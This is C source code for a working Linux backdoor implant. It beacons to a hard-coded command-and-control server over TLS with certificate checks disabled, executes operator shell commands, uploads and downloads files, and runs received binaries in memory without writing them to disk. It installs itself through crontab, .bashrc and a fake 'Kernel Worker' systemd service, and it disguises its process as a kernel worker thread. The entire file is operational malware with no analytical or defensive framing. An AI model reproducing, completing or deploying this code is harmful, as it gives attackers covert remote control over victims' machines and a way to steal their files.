#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stddef.h>
#include <stdint.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <time.h>
#include <sys/prctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <fcntl.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <dlfcn.h>

#define C2_HOST       "192.168.0.32"
#define C2_PORT       4444
#define C2_HTTP_PORT  8080
#define BEACON_SLEEP  5
#define JITTER_PCT    20
#define RETRY_SLEEP   10
#define PROC_NAME     "kworker/0:1H"
#define MFD_CLOEXEC   1

/* ── jitter sleep ── */
void jitter_sleep(int base) {
    int jitter   = (base * JITTER_PCT) / 100;
    int sleep_ms = (base - jitter) + (rand() % (jitter * 2 + 1));
    sleep(sleep_ms);
}

/* ── fileless execution ── */
int memexec(unsigned char *data, size_t size, char *name) {
    int fd = (int)syscall(SYS_memfd_create, name, MFD_CLOEXEC);
    if (fd < 0) return -1;
    size_t w = 0;
    while (w < size) {
        ssize_t r = write(fd, data + w, size - w);
        if (r < 0) { close(fd); return -1; }
        w += (size_t)r;
    }
    pid_t pid = fork();
    if (pid == 0) {
        char path[64];
        snprintf(path, sizeof(path), "/proc/self/fd/%d", fd);
        char *args[] = { name, NULL };
        execve(path, args, NULL);
        exit(1);
    }
    close(fd);
    if (pid > 0) waitpid(pid, NULL, 0);
    return 0;
}

/* ── shell command execution ── */
char* run_command(char *cmd) {
    char *out = malloc(65536);
    if (!out) return NULL;
    memset(out, 0, 65536);
    FILE *fp = popen(cmd, "r");
    if (!fp) { strcpy(out, "error: popen failed"); return out; }
    fread(out, 1, 65535, fp);
    pclose(fp);
    if (strlen(out) == 0) strcpy(out, "ok");
    int len = (int)strlen(out);
    if (len > 0 && out[len-1] == '\n') out[len-1] = 0;
    return out;
}

/* ── base64 ── */
static const char B64[] =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

char* b64_encode(const unsigned char *in, size_t len) {
    size_t outlen = ((len + 2) / 3) * 4 + 1;
    char *out = malloc(outlen);
    if (!out) return NULL;
    size_t i = 0, j = 0;
    while (i < len) {
        uint32_t a = (i < len) ? in[i++] : 0;
        uint32_t b = (i < len) ? in[i++] : 0;
        uint32_t c = (i < len) ? in[i++] : 0;
        uint32_t t = (a << 16) | (b << 8) | c;
        out[j++] = B64[(t >> 18) & 0x3F];
        out[j++] = B64[(t >> 12) & 0x3F];
        out[j++] = B64[(t >>  6) & 0x3F];
        out[j++] = B64[(t >>  0) & 0x3F];
    }
    size_t mod = len % 3;
    if (mod == 1) { out[j-2] = '='; out[j-1] = '='; }
    else if (mod == 2) { out[j-1] = '='; }
    out[j] = 0;
    return out;
}

/* ── upload handler ── */
void handle_upload(SSL *ssl, char *header) {
    char *body = header + 10;
    char *sep  = strstr(body, "__");
    if (!sep) { SSL_write(ssl, "error: bad upload header\n", 25); return; }
    size_t plen = (size_t)(sep - body);
    if (plen == 0 || plen >= 512) { SSL_write(ssl, "error: bad path\n", 16); return; }
    char path[512];
    strncpy(path, body, plen);
    path[plen] = 0;
    uint64_t size = (uint64_t)strtoull(sep + 2, NULL, 10);
    if (size == 0 || size > 100ULL * 1024 * 1024) {
        SSL_write(ssl, "error: bad size\n", 16);
        return;
    }
    unsigned char *buf = malloc(size);
    if (!buf) { SSL_write(ssl, "error: malloc\n", 14); return; }
    size_t got = 0;
    while (got < (size_t)size) {
        int r = SSL_read(ssl, buf + got, (int)(size - got));
        if (r <= 0) break;
        got += (size_t)r;
    }
    FILE *f = fopen(path, "wb");
    if (!f) { free(buf); SSL_write(ssl, "error: fopen\n", 13); return; }
    fwrite(buf, 1, got, f);
    fclose(f);
    free(buf);
    char resp[256];
    snprintf(resp, sizeof(resp), "ok: wrote %zu bytes to %s\n", got, path);
    SSL_write(ssl, resp, (int)strlen(resp));
}

/* ── download handler ── */
void handle_download(SSL *ssl, char *path) {
    FILE *f = fopen(path, "rb");
    if (!f) { SSL_write(ssl, "error: file not found\n", 22); return; }
    fseek(f, 0, SEEK_END);
    long fsz = ftell(f);
    fseek(f, 0, SEEK_SET);
    if (fsz <= 0) { fclose(f); SSL_write(ssl, "error: empty file\n", 18); return; }
    unsigned char *buf = malloc((size_t)fsz);
    if (!buf) { fclose(f); SSL_write(ssl, "error: malloc\n", 14); return; }
    fread(buf, 1, (size_t)fsz, f);
    fclose(f);
    char *b64 = b64_encode(buf, (size_t)fsz);
    free(buf);
    if (!b64) { SSL_write(ssl, "error: b64\n", 11); return; }
    SSL_write(ssl, b64, (int)strlen(b64));
    SSL_write(ssl, "\n", 1);
    free(b64);
}

/* ── persistence ── */
void persist(void) {
    char exe_path[512];
    char install_path[512];
    char cmd[1024];

    ssize_t len = readlink("/proc/self/exe", exe_path, sizeof(exe_path) - 1);
    if (len < 0) return;
    exe_path[len] = 0;

    char *home = getenv("HOME");
    if (!home) return;

    snprintf(install_path, sizeof(install_path), "%s/.local/share/.cache", home);
    mkdir(install_path, 0755);
    snprintf(install_path, sizeof(install_path), "%s/.local/share/.cache/kworker", home);
    snprintf(cmd, sizeof(cmd), "cp %s %s 2>/dev/null", exe_path, install_path);
    system(cmd);
    snprintf(cmd, sizeof(cmd), "chmod +x %s 2>/dev/null", install_path);
    system(cmd);

    snprintf(cmd, sizeof(cmd),
        "(crontab -l 2>/dev/null | grep -v kworker; echo \"@reboot %s\") | crontab - 2>/dev/null",
        install_path);
    system(cmd);

    char bashrc[512];
    snprintf(bashrc, sizeof(bashrc), "%s/.bashrc", home);
    FILE *f = fopen(bashrc, "a");
    if (f) {
        fprintf(f, "\n# system update\nnohup %s >/dev/null 2>&1 &\n", install_path);
        fclose(f);
    }

    char svc_dir[512];
    snprintf(svc_dir, sizeof(svc_dir), "%s/.config/systemd/user", home);
    snprintf(cmd, sizeof(cmd), "mkdir -p %s 2>/dev/null", svc_dir);
    system(cmd);
    char svc_path[512];
    snprintf(svc_path, sizeof(svc_path), "%s/kworker.service", svc_dir);
    f = fopen(svc_path, "w");
    if (f) {
        fprintf(f,
            "[Unit]\nDescription=Kernel Worker\n\n"
            "[Service]\nExecStart=%s\nRestart=always\nRestartSec=10\n\n"
            "[Install]\nWantedBy=default.target\n",
            install_path);
        fclose(f);
        snprintf(cmd, sizeof(cmd),
            "systemctl --user enable kworker.service 2>/dev/null && "
            "systemctl --user start kworker.service 2>/dev/null");
        system(cmd);
    }
}

/* ── TLS connect ── */
int connect_to_c2(SSL_CTX *ctx, SSL **ssl_out) {
    struct hostent   *he;
    struct sockaddr_in srv;
    int   sock;
    SSL  *ssl;
    he = gethostbyname(C2_HOST);
    if (!he) return -1;
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return -1;
    memset(&srv, 0, sizeof(srv));
    srv.sin_family = AF_INET;
    srv.sin_port   = htons(C2_PORT);
    memcpy(&srv.sin_addr, he->h_addr, (size_t)he->h_length);
    if (connect(sock, (struct sockaddr*)&srv, sizeof(srv)) < 0) {
        close(sock); return -1;
    }
    ssl = SSL_new(ctx);
    SSL_set_fd(ssl, sock);
    if (SSL_connect(ssl) <= 0) {
        SSL_free(ssl); close(sock); return -1;
    }
    *ssl_out = ssl;
    return sock;
}

/* ── beacon loop ── */
void beacon_loop(SSL *ssl) {
    char buf[4096];
    while (1) {
        memset(buf, 0, sizeof(buf));
        int n = SSL_read(ssl, buf, (int)sizeof(buf) - 1);
        if (n <= 0) break;
        buf[strcspn(buf, "\n")] = 0;
        if (buf[0] == 0) continue;

        if (strncmp(buf, "__upload__", 10) == 0) {
            handle_upload(ssl, buf);
            continue;
        }
        if (strncmp(buf, "__download__", 12) == 0) {
            handle_download(ssl, buf + 12);
            continue;
        }
        if (strncmp(buf, "__persist__", 11) == 0) {
            persist();
            SSL_write(ssl, "ok: persistence installed\n", 26);
            continue;
        }
        if (strncmp(buf, "__memexec__", 11) == 0) {
            size_t sz = (size_t)atol(buf + 11);
            if (sz == 0 || sz > 10UL * 1024 * 1024) {
                SSL_write(ssl, "error: bad size\n", 16);
                continue;
            }
            unsigned char *bin = malloc(sz);
            if (!bin) { SSL_write(ssl, "error: malloc\n", 14); continue; }
            size_t got = 0;
            while (got < sz) {
                int r = SSL_read(ssl, bin + got, (int)(sz - got));
                if (r <= 0) break;
                got += (size_t)r;
            }
            int ret = memexec(bin, got, "kworker");
            free(bin);
            SSL_write(ssl, ret == 0
                ? "ok: executed in memory\n"
                : "error: memexec failed\n", 23);
            continue;
        }

        char *out = run_command(buf);
        if (out) {
            SSL_write(ssl, out, (int)strlen(out));
            SSL_write(ssl, "\n", 1);
            free(out);
        }
    }
}

/* ── process masquerade ── */
void masquerade(char *argv0) {
    prctl(PR_SET_NAME, PROC_NAME, 0, 0, 0);
    size_t olen = strlen(argv0);
    memset(argv0, 0, olen);
    strncpy(argv0, PROC_NAME, olen);
}

/* ── entry point ── */
int main(int argc, char *argv[]) {
    (void)argc;
    srand((unsigned)time(NULL));
    masquerade(argv[0]);

    SSL_CTX *ctx;
    SSL_library_init();
    SSL_load_error_strings();
    ctx = SSL_CTX_new(TLS_client_method());
    SSL_CTX_set_verify(ctx, SSL_VERIFY_NONE, NULL);

    while (1) {
        SSL *ssl  = NULL;
        int  sock = connect_to_c2(ctx, &ssl);
        if (sock < 0) { sleep(RETRY_SLEEP); continue; }
        beacon_loop(ssl);
        SSL_shutdown(ssl);
        SSL_free(ssl);
        close(sock);
        sleep(RETRY_SLEEP);
    }

    SSL_CTX_free(ctx);
    return 0;
}
